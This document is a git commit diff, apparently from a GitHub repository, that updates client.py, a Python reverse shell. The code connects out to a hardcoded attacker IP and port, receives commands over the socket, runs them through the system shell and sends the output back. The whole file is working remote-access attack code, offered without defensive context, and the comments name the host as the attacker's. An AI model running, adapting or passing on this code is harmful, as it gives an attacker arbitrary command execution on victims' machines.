5d1d09c5e583e6e2176f8abdb67a0e0bb18ee634
Gian López <85188124+netgian@users.noreply.github.com>
2021-08-28 20:27:48 +0200

    Update client.py

--- client.py
+++ client.py
@@ -1,32 +1,30 @@
-import os
-import socket
 import subprocess
-import sys
+import socket
+import os
 
-host = ""  # Here must go the public IP of the attacker
-port = 10000  # And here the attacker's open port
+HOST = "37.15.125.211"  # Your public IP
+PORT = 10000  # Your open port
 client = socket.socket()
 
 
 def socket_connect():
     try:
-        client.connect((host, port))
-    except socket.error as e:
-        sys.exit()
+        client.connect((HOST, PORT))
+    except socket.error:
+        exit()
 
 
 def receive_commands():
     try:
-        client.send(f"{os.getcwd()}".encode())
         while True:
-            data = client.recv(1024)
-            if data[:2].decode("utf-8", errors="ignore") == 'cd':
-                os.chdir(data[3:].decode("utf-8", errors="ignore"))
-            if len(data) > 0:
-                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-                output_bytes = cmd.stdout.read() + cmd.stderr.read()
-                output_str = str(output_bytes, "utf-8", errors="ignore")
-                client.send(f"{output_str}{os.getcwd()}".encode())
+            data = client.recv(131072).decode("utf-8", "ignore")
+
+            if data.startswith("cd "):
+                os.chdir(data[3:])
+
+            output = subprocess.getoutput(data) + "\n" + os.getcwd()
+            client.send(output.encode())
+
     except socket.error:
         client.close()
 
